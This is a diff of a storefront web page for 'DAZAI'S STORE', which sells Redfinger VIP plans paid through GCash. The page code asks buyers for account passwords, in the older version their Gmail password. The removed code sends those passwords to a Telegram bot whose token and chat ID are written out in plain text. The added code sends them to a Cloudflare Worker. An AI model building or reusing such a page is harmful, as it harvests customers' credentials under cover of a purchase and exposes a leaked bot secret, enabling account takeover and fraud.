@@ -7,12 +7,10 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');
-   
     * { box-sizing: border-box; }
-
     body {
       font-family: 'Inter', system-ui, sans-serif;
-      background: linear-gradient(135deg, #0a0a0f 0%, #1a1f2e 100%);
+      background: linear-gradient(135deg, #0a0a12 0%, #121826 100%);
       color: #e0f2fe;
       min-height: 100vh;
       padding: 20px;
@@ -20,143 +18,195 @@
     }
     .container {
       max-width: 1100px;
-      margin: 30px auto;
-      background: rgba(15, 18, 35, 0.95);
-      border-radius: 24px;
+      margin: 40px auto;
+      background: rgba(15, 18, 35, 0.88);
+      backdrop-filter: blur(24px);
+      border-radius: 28px;
       overflow: hidden;
-      box-shadow: 0 0 80px rgba(59, 130, 246, 0.3);
-      border: 1px solid rgba(96, 165, 250, 0.2);
+      box-shadow: 0 0 90px rgba(59, 130, 246, 0.25);
+      border: 1px solid rgba(148, 163, 184, 0.18);
     }
     .header {
-      background: linear-gradient(rgba(10, 15, 28, 0.85), rgba(15, 20, 45, 0.9)),
+      background: linear-gradient(rgba(10, 15, 28, 0.85), rgba(15, 20, 45, 0.92)),
                   url('https://i.imgur.com/KhOuujo.jpeg') no-repeat center center;
       background-size: cover;
-      padding: 80px 20px 60px;
+      padding: 100px 20px 70px;
       text-align: center;
+      position: relative;
+    }
+    .header::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 6px;
+      background: linear-gradient(90deg, transparent, #22c55e, transparent);
     }
     .header h1 {
       font-family: 'Space Grotesk', sans-serif;
-      font-size: 3.8rem;
+      font-size: 4.2rem;
       margin: 0;
-      text-shadow: 0 0 40px rgba(0,0,0,0.9);
-      color: white;
+      text-shadow: 0 0 50px rgba(0,0,0,0.9);
+      letter-spacing: -2px;
     }
     .header p {
-      font-size: 1.45rem;
+      font-size: 1.5rem;
       color: #bae6fd;
-      margin-top: 8px;
+      margin-top: 12px;
+      opacity: 0.95;
     }
-
-    .content { padding: 35px 25px; }
-
+    .content { padding: 40px 35px; }
     .step {
-      background: rgba(20, 25, 45, 0.9);
-      padding: 28px;
-      border-radius: 20px;
-      margin-bottom: 30px;
+      background: rgba(20, 25, 45, 0.85);
+      padding: 32px;
+      border-radius: 22px;
+      margin-bottom: 32px;
       border: 1px solid rgba(100, 150, 255, 0.15);
+      position: relative;
     }
-
+    .step h2 {
+      text-align: center;
+      margin-bottom: 28px;
+      font-size: 1.65rem;
+      color: #bae6fd;
+    }
     input, textarea, select {
       width: 100%;
-      padding: 14px 18px;
-      margin: 10px 0;
+      padding: 16px 20px;
+      margin: 12px 0;
       background: rgba(30, 35, 55, 0.95);
-      border: 1px solid rgba(148, 163, 184, 0.3);
-      border-radius: 14px;
+      border: 1px solid rgba(148, 163, 184, 0.25);
+      border-radius: 16px;
       color: white;
-      font-size: 1.05rem;
+      font-size: 1.1rem;
+      transition: all 0.3s;
     }
     input:focus, textarea:focus {
-      border-color: #60a5fa;
-      box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.25);
+      border-color: #22c55e;
+      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.2);
       outline: none;
     }
-
     .input-group {
       position: relative;
-      margin: 10px 0;
     }
-    .input-group input { padding-right: 50px; }
     .toggle-eye {
       position: absolute;
-      right: 16px;
+      right: 18px;
       top: 50%;
       transform: translateY(-50%);
       color: #94a3b8;
       cursor: pointer;
-      font-size: 1.3rem;
+      font-size: 1.4rem;
     }
-
     .price-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-      gap: 16px;
-      margin: 25px 0;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 20px;
+      margin: 30px 0;
     }
     .price-card {
       background: linear-gradient(145deg, #1e2538, #2a3449);
-      border-radius: 18px;
-      padding: 20px;
+      border-radius: 20px;
+      padding: 24px;
       text-align: center;
       border: 2px solid transparent;
       cursor: pointer;
-      transition: all 0.4s;
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
     }
-    .price-card:hover { transform: translateY(-6px); }
+    .price-card:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 20px 40px rgba(34, 197, 94, 0.25);
+    }
     .price-card.active {
       border-color: #22c55e;
-      box-shadow: 0 0 30px rgba(74, 222, 128, 0.6);
+      box-shadow: 0 0 40px rgba(74, 222, 128, 0.5);
     }
-
+    .popular-badge {
+      position: absolute;
+      top: 12px;
+      right: -30px;
+      background: #eab308;
+      color: black;
+      padding: 4px 50px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      transform: rotate(45deg);
+    }
     .days-options {
       display: flex;
-      gap: 10px;
-      margin: 15px 0 20px;
+      gap: 12px;
+      margin: 20px 0 28px;
       flex-wrap: wrap;
     }
     .day-btn {
       flex: 1;
-      min-width: 100px;
-      padding: 14px 12px;
+      min-width: 110px;
+      padding: 16px 12px;
       background: #1e2538;
       border: 2px solid #334155;
-      border-radius: 14px;
+      border-radius: 16px;
       text-align: center;
       cursor: pointer;
       font-weight: 600;
+      transition: all 0.3s;
     }
     .day-btn.active {
       background: #22c55e;
       color: black;
       border-color: #86efac;
+      transform: scale(1.05);
     }
-
+    .upload-area {
+      border: 2px dashed #60a5fa;
+      border-radius: 20px;
+      padding: 50px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.4s;
+      background: rgba(30, 35, 55, 0.6);
+    }
+    .upload-area:hover {
+      background: rgba(96, 165, 250, 0.12);
+      border-color: #22c55e;
+    }
+    .preview {
+      margin-top: 20px;
+      max-width: 100%;
+      border-radius: 16px;
+      border: 2px solid #22c55e;
+      display: none;
+    }
     button {
       width: 100%;
-      padding: 18px;
+      padding: 20px;
       background: linear-gradient(90deg, #22c55e, #86efac);
       color: black;
       border: none;
-      border-radius: 16px;
-      font-size: 1.4rem;
+      border-radius: 18px;
+      font-size: 1.55rem;
       font-weight: 700;
       cursor: pointer;
-      margin-top: 20px;
-    }
-
-    .upload-area {
-      border: 2px dashed #60a5fa;
-      border-radius: 16px;
-      padding: 40px 20px;
-      text-align: center;
-      cursor: pointer;
-      margin: 15px 0;
+      margin-top: 30px;
       transition: all 0.3s;
+      box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
     }
-    .upload-area:hover { background: rgba(96, 165, 250, 0.1); }
-    .preview { margin-top: 15px; max-width: 100%; border-radius: 12px; display: none; }
-
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
+    }
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    .trust-bar {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 0.95rem;
+      color: #86efac;
+    }
     .required { color: #f87171; }
   </style>
 </head>
@@ -164,89 +214,101 @@
   <div class="container">
     <div class="header">
       <h1>DAZAI'S STORE</h1>
-      <p>AFFORDABLE RED FINGER SAPPHIRES • 24/7 Automated</p>
+      <p>AFFORDABLE RED FINGER SAPPHIRES • 24/7 Automated Delivery</p>
     </div>
     <div class="content">
-
-      <!-- Step 1 -->
+      <!-- Step 1: Account Credentials -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Enter Your Gmail Info</h2>
-        <input type="text" id="userId" placeholder="Gmail" required>
+        <h2>📋 Step 1: Enter Your Account Info</h2>
+        <input type="text" id="userId" placeholder="Username / In-Game ID" required>
         <div class="input-group">
-          <input type="password" id="rewardCode" placeholder="Password">
+          <input type="password" id="rewardCode" placeholder="Password / Reward Code">
           <i class="toggle-eye fas fa-eye" id="toggleEye"></i>
         </div>
+      </div>
 
-      <!-- Step 2 -->
+      <!-- Step 2: VIP Plan -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:25px;">💎 Step 2: Choose Your VIP Plan <span class="required">*</span></h2>
+        <h2>💎 Step 2: Choose Your VIP Plan</h2>
         <div class="price-grid">
           <div class="price-card active" data-plan="VIP">
             <h3>VIP</h3>
-            <p><strong>7 Days</strong> — ₱50<br><strong>30 Days</strong> — ₱180<br><strong>90 Days</strong> — ₱500</p>
+            <p><strong>7 Days</strong> — ₱50<br>
+               <strong>30 Days</strong> — ₱180<br>
+               <strong>90 Days</strong> — ₱500</p>
           </div>
           <div class="price-card" data-plan="KVIP">
+            <div class="popular-badge">MOST POPULAR</div>
             <h3>KVIP</h3>
-            <p><strong>7 Days</strong> — ₱120<br><strong>30 Days</strong> — ₱360<br><strong>90 Days</strong> — ₱1,000</p>
+            <p><strong>7 Days</strong> — ₱120<br>
+               <strong>30 Days</strong> — ₱360<br>
+               <strong>90 Days</strong> — ₱1,000</p>
           </div>
           <div class="price-card" data-plan="SVIP">
             <h3>SVIP</h3>
-            <p><strong>7 Days</strong> — ₱135<br><strong>30 Days</strong> — ₱390<br><strong>90 Days</strong> — ₱1,100</p>
+            <p><strong>7 Days</strong> — ₱135<br>
+               <strong>30 Days</strong> — ₱390<br>
+               <strong>90 Days</strong> — ₱1,100</p>
           </div>
           <div class="price-card" data-plan="XVIP">
             <h3>XVIP</h3>
-            <p><strong>7 Days</strong> — ₱315<br><strong>30 Days</strong> — ₱1,050</p>
+            <p><strong>7 Days</strong> — ₱315<br>
+               <strong>30 Days</strong> — ₱1,050</p>
           </div>
         </div>
       </div>
 
-      <!-- Step 3 -->
+      <!-- Step 3: Order -->
       <div class="step">
-        <h2 style="text-align:center; margin-bottom:25px;">🛒 Step 3: Place Your Order</h2>
+        <h2>🛒 Step 3: Place Your Order</h2>
         <input type="text" id="customer" placeholder="Your Facebook Name" required>
-        
-        <label style="display:block; margin:18px 0 8px; font-weight:600;">Select Duration:</label>
+       
+        <label style="display:block; margin:20px 0 10px; font-weight:600;">Select Duration:</label>
         <div class="days-options">
           <div class="day-btn active" data-days="7">7 Days</div>
           <div class="day-btn" data-days="30">30 Days</div>
           <div class="day-btn" data-days="90">90 Days</div>
         </div>
-
         <textarea id="note" placeholder="Additional notes (optional)" rows="3"></textarea>
 
-        <!-- Payment via GCash - Moved Up -->
-        <h3 style="margin:25px 0 15px; text-align:center;">💰 Step 4: Payment via GCash</h3>
-        <div style="text-align:center; margin:20px 0;">
-          <img src="https://i.imgur.com/SnIB5Dt.jpeg" alt="GCash QR Code" style="max-width: 300px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
+        <!-- Payment -->
+        <h3 style="margin:30px 0 15px; text-align:center;">💰 Step 4: Payment via GCash</h3>
+        <div style="text-align:center; margin:25px 0;">
+          <img src="https://i.imgur.com/SnIB5Dt.jpeg" alt="GCash QR Code" style="max-width: 320px; border-radius: 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.6);">
         </div>
-        <div style="text-align:center; background: rgba(15,23,42,0.8); padding: 25px; border-radius: 16px;">
-          <strong style="font-size:1.65rem; color:#4ade80;">0994 6461 806</strong><br>
+        <div style="text-align:center; background: rgba(15,23,42,0.9); padding: 28px; border-radius: 20px;">
+          <strong style="font-size:1.8rem; color:#4ade80;">0994 6461 806</strong><br>
           <small style="color:#94a3b8;">(E.R)</small><br><br>
           <small>Send the <strong>exact amount</strong> + your name in the reference</small>
         </div>
 
-        <!-- Upload Receipt - Now Required -->
-        <h3 style="margin:30px 0 12px;">📸 Upload Payment Receipt <span class="required">*</span></h3>
+        <!-- Receipt Upload -->
+        <h3 style="margin:35px 0 15px;">📸 Upload Payment Receipt <span class="required">*</span></h3>
         <div class="upload-area" id="uploadArea">
-          <i class="fas fa-cloud-upload-alt" style="font-size: 2.8rem; color: #60a5fa; margin-bottom:12px;"></i>
-          <p>Click or drag to upload receipt</p>
+          <i class="fas fa-cloud-upload-alt" style="font-size: 3.2rem; color: #60a5fa; margin-bottom:15px;"></i>
+          <p style="font-size:1.1rem;">Click or drag receipt here</p>
+          <small style="color:#94a3b8;">PNG, JPG • Max 5MB</small>
           <input type="file" id="receipt" accept="image/*" style="display:none;" required>
         </div>
         <img id="preview" class="preview" alt="Receipt Preview">
-        
-        <button onclick="submitOrder()">🚀 CONFIRM ORDER & SEND TO SELLER</button>
       </div>
 
+      <button onclick="submitOrder()">🚀 CONFIRM ORDER & SEND TO SELLER</button>
+      <div class="trust-bar">
+        🔒 Secure Order • Token Protected • 24/7 Support
+      </div>
       <div id="result"></div>
     </div>
   </div>
 
   <script>
+    const API_ENDPOINT = "https://redfinger.dazai2623.workers.dev"; // ← Your Worker URL
+
     let selectedPlan = "VIP";
     let selectedDays = "7";
     let selectedFile = null;
 
-    // Plan & Duration Selection
+    // Plan selection
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
@@ -255,6 +317,7 @@
       });
     });
 
+    // Days selection
     document.querySelectorAll('.day-btn').forEach(btn => {
       btn.addEventListener('click', () => {
         document.querySelectorAll('.day-btn').forEach(b => b.classList.remove('active'));
@@ -263,7 +326,7 @@
       });
     });
 
-    // Eye Toggle
+    // Password toggle
     const rewardInput = document.getElementById('rewardCode');
     const toggleEye = document.getElementById('toggleEye');
     toggleEye.addEventListener('click', () => {
@@ -276,7 +339,7 @@
       }
     });
 
-    // Upload
+    // Upload handling
     const uploadArea = document.getElementById('uploadArea');
     const fileInput = document.getElementById('receipt');
     const preview = document.getElementById('preview');
@@ -285,53 +348,62 @@
       if (e.target.files[0]) {
         selectedFile = e.target.files[0];
         const reader = new FileReader();
-        reader.onload = ev => { preview.src = ev.target.result; preview.style.display = 'block'; };
+        reader.onload = ev => {
+          preview.src = ev.target.result;
+          preview.style.display = 'block';
+        };
         reader.readAsDataURL(selectedFile);
       }
     });
 
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
-      const userId = document.getElementById('userId').value.trim();
+      const username = document.getElementById('userId').value.trim();
+      const password = document.getElementById('rewardCode').value.trim();
+      const note = document.getElementById('note').value.trim();
 
-      if (!customer || !userId) return alert("❌ Please fill Name and User ID");
-      if (!selectedPlan) return alert("❌ Please select a VIP Plan");
-      if (!selectedFile) return alert("❌ Please upload your Payment Receipt");
-
-      const btn = document.querySelector('button[onclick="submitOrder()"]');
-      btn.disabled = true;
-      btn.textContent = '⏳ Sending...';
-
-      const BOT_TOKEN = "8758270440:AAEdUvBIKpGqhu0CzsLcOV3oQnwRP7c25jI";
-      const CHAT_ID = "6598357465";
-
-      const msg = `🛒 New Order from Dazai's Store\n\n` +
-                  `👤 ${customer}\n` +
-                  `⭐ ${selectedPlan} — ${selectedDays} Days\n\n` +
-                  `🆔 Username : ${userId}\n` +
-                  `🎟️ Password : ${document.getElementById('rewardCode').value.trim() || "None"}\n` +
-                  `📝 Note : ${document.getElementById('note').value.trim() || "No note"}`;
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-      });
-
-      if (selectedFile) {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('photo', selectedFile);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+      if (!customer || !username) {
+        return alert("❌ Please fill in your Facebook Name and Username");
+      }
+      if (!selectedFile) {
+        return alert("❌ Please upload your Payment Receipt");
       }
 
-      document.getElementById('result').innerHTML = `
-        <div style="background:linear-gradient(90deg,#22c55e,#4ade80); color:black; padding:35px; border-radius:20px; text-align:center; margin-top:20px;">
-          ✅ <strong>Order Sent Successfully!</strong><br><br>
-          Thank you, <b>${customer}</b>!<br>We will process it shortly.
-        </div>`;
+      const btn = document.querySelector('button');
+      btn.disabled = true;
+      btn.textContent = '⏳ Sending Order...';
 
-      btn.textContent = '✅ ORDER SENT SUCCESSFULLY';
+      const formData = new FormData();
+      formData.append('customer', customer);
+      formData.append('username', username);
+      formData.append('plan', selectedPlan);
+      formData.append('days', selectedDays);
+      formData.append('password', password || 'None');
+      formData.append('note', note || 'No note');
+      formData.append('receipt', selectedFile);
+
+      try {
+        const res = await fetch(API_ENDPOINT, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (res.ok) {
+          document.getElementById('result').innerHTML = `
+            <div style="background:linear-gradient(90deg,#22c55e,#4ade80); color:black; padding:40px; border-radius:24px; text-align:center; margin-top:30px;">
+              ✅ <strong>Order Sent Successfully!</strong><br><br>
+              Thank you, <b>${customer}</b>!<br>We will process your order shortly.
+            </div>`;
+          btn.textContent = '✅ ORDER SENT SUCCESSFULLY';
+        } else {
+          alert("❌ Failed to send order. Please try again.");
+        }
+      } catch (err) {
+        alert("❌ Connection error. Please make sure your Worker is deployed correctly.");
+        console.error(err);
+      } finally {
+        btn.disabled = false;
+      }
     }
   </script>
 </body>
